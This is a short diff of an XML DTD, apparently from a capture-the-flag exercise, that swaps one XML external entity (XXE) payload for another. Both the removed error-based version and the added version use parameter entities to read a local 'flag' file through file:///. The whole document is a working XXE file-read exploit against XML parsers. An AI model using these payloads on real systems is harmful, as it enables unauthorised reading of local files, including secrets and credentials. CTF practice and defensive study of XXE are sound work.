@@ -1,4 +1,3 @@
-<!ENTITY % hi SYSTEM "file:///flag_399959b2b76194a81df71b4f73593a47">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%hi;'>">
-%eval;
-%error;
+<!ENTITY % payload SYSTEM "file:///flag_399959b2b76194a81df71b4f73593a47">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;
